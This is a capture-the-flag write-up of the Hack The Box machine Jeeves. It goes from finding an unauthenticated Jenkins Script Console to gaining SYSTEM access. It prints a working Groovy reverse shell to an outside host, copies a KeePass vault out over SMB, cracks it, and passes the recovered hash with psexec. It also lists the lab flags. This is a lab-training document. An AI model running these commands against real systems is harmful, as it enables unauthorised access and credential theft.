# HTB Jeeves — Writeup

**Machine:** Jeeves (Hack The Box, retired machine)
**IP:** 10.129.228.112
**Difficulty:** Medium
**OS:** Windows — this is a standalone machine, not part of a domain (no Active Directory).
**Author:** Faridd
---

## 1. Scanning the machine

First I ran a quick port scan to see what's open:

```bash
rustscan -a 10.129.228.112
```

**Result:**
```
Open 10.129.228.112:80
Open 10.129.228.112:135
Open 10.129.228.112:445
Open 10.129.228.112:50000
```

Then I ran a more detailed scan on those ports to see what services are running:

```bash
nmap -sC -sV -p80,445,50000 10.129.228.112
```

**Result (important parts):**
```
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
```

**What this tells me:**
- Port 80 is a simple website called "Ask Jeeves".
- Port 445 is SMB (Windows file sharing). It says "workgroup", which means this machine is NOT part of a domain — it's a standalone computer.
- Port 50000 shows an error page, but that doesn't mean nothing is there — I just haven't found the right path yet.

I also tried to connect to SMB without a login, but it was blocked:

```bash
smbclient -L //10.129.228.112/ -N
# Access denied

rpcclient -U '' 10.129.228.112 -N
# Access denied
```

So I moved on to checking the websites instead.

---

## 2. Finding hidden pages on port 50000

Port 50000 showed a 404 error page, but that just means the main page doesn't exist — there could still be other pages hidden behind it. 

```bash
ffuf -u http://10.129.228.112:50000/FUZZ \
     -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt \
     -ic
```

**Result:**
```
askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 77ms]
```

It found a page called `/askjeeves`. The status code 302 means "redirect", which usually means there's something real behind that page.

---

## 3. Found Jenkins, got a shell

When I opened `http://10.129.228.112:50000/askjeeves` in the browser, it turned out to be a **Jenkins** server. Jenkins is a tool used by developers to automate building and running code.

Jenkins has a feature called the **Script Console**, found at the `/script` path. This console lets you run code directly on the server. Normally this should require a login, but on this machine it did not — anyone could open it and run commands.

**Note:** This is the actual security hole here — an admin tool that should be locked behind a password was left open to anyone.

### Getting a reverse shell

```bash
nc -nvlp 4444
```

Then, inside the Jenkins Script Console, I ran this code (this is Groovy, the language Jenkins scripts use). Since the target is Windows, it opens `cmd.exe` and connects it back to my machine:

```groovy
String host="10.10.16.245";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();
s.close();
```

This worked. My listener caught a connection, and I now had a command line on the target machine as the user `jeeves\kohsuke`.

---

## 4. Getting the user flag

Once I had the shell, I checked the desktop of that user and found the flag file:

```
C:\Users\kohsuke\Desktop> type user.txt
e3232272596fb47950d59c4cf1e7066a

C:\Users\kohsuke\Desktop> whoami
jeeves\kohsuke
```

**User flag:** `e3232272596fb47950d59c4cf1e7066a`

---

## 5. Trying to become admin (first attempts, didn't work)

I checked what special permissions my current user has:

```
C:\Users\Administrator\.jenkins> whoami /priv

Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

**What this means in simple terms:** `SeImpersonatePrivilege` is a permission that, on many Windows machines, can be abused with certain tools to trick the system into giving you full admin (SYSTEM) access. There are several known tools that do this, commonly nicknamed "Potato" tools (PrintSpoofer, GodPotato, JuicyPotato, etc.).

**Note: I tried PrintSpoofer and GodPotato, but neither one worked.**

```
C:\temp> .\PrintSpoofer64.exe -i -c "cmd.exe"
# nothing happened, still just a normal user

C:\temp> .\GodPotato-NET4.exe -cmd "cmd /c whoami"
...
[!] Failed to impersonate security context token
```

My best guess why: this Windows build is very old (from 2015 — Windows 10 version 10586). These tools are built to work on how newer Windows versions handle certain background services, so on such an old system they just don't work the way they're supposed to.

So instead of spending more time on that, I decided to look around the file system for other clues.

---

## 6. Found a password vault file

While checking the `kohsuke` user's Documents folder, I found this:

```
C:\Users\kohsuke\Documents> dir

09/18/2017  01:43 PM             2,846 CEH.kdbx
```

**What is a .kdbx file?**
A `.kdbx` file is a database created by a program called **KeePass**. KeePass is a password manager — it stores usernames and passwords for many different accounts inside one file, and that whole file is locked with a single master password. Without the master password, you can't see what's inside. My goal here was to steal this file, try to crack the master password, and see what logins are stored inside.

### Copying the file to my own computer

```bash
impacket-smbserver -smb2support Share . -username=admin -password=admin
```

In Windows target machine:
```
C:\temp> net use \\10.10.16.245\Share /user:admin admin
The command completed successfully.

C:\Users\kohsuke\Documents> copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.16.245\Share\CEH.kdbx
        1 file(s) copied.
```

Now the file was on my Kali machine, ready to crack.

---

## 7. Cracking the master password

```bash
keepass2john CEH.kdbx > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result:**
```
moonshine1       (CEH)
```

The master password turned out to be **`moonshine1`** — a common word from the password list, which is why it was crackable so fast.

---

## 8. Opening the vault and reading the saved passwords

With the master password, I opened the file using `kpcli`, a command-line tool for browsing KeePass files:

```bash
kpcli --kdb=CEH.kdbx
Provide the master password: moonshine1
```

Inside, there was a list of saved entries:

```
kpcli:/CEH> ls
=== Entries ===
0. Backup stuff
1. Bank of America
2. DC Recovery PW
3. EC-Council
4. It's a secret
5. Jenkins admin
6. Keys to the kingdom
7. Walmart.com
```

I checked a few of them:

The important one was **"Backup stuff"**:

```
kpcli:/CEH> show -f 0
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

Since winrm port is not open, we will use impacket-psexec tool to access the system as Administrator.
---

## 9. Logging in as Administrator using the hash

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
```

**Result:**
```
[*] Found writable share ADMIN$
[*] Uploading file wLyrWkzQ.exe
[*] Creating service OpEw on 10.129.228.112.....
[*] Starting service OpEw.....

C:\Windows\system32> whoami
nt authority\system
```

---

## 10. Root flag — hidden inside another file

Now with full access, I went to the Administrator's desktop:

```
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> dir

12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
```

I opened the text file expecting the flag, but got this instead:

```
C:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```

So the real flag was hidden somewhere else, not in plain sight.

**What is `dir /R` and why does it matter?**
On Windows, a file can secretly carry extra hidden data attached to it, called an **Alternate Data Stream (ADS)**. Think of it like a sealed envelope taped to the back of a regular piece of paper — if you just read the paper normally (with `type` or a normal `dir`), you'll never notice the envelope is there. The normal `dir` command does not show these hidden extras at all.

The command `dir /R` is a special version of `dir` that also shows these hidden extras attached to files. I ran it on the Desktop folder:

```
C:\Users\Administrator\Desktop> dir /R C:\Users\Administrator\Desktop\

12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
```

See the second line — `hm.txt:root.txt:$DATA`. This means the file `hm.txt` has a hidden extra piece of data attached to it, and that hidden piece is named `root.txt`. It's not a separate file you can see in a normal folder listing — it's stuck inside `hm.txt` itself, invisible until you specifically look for it.

To read that hidden part, I used this syntax (filename, then colon, then the hidden stream's name):

```
C:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```

**Root flag:** `afbc5bd4b615a60648cec41c6ac92530`

---
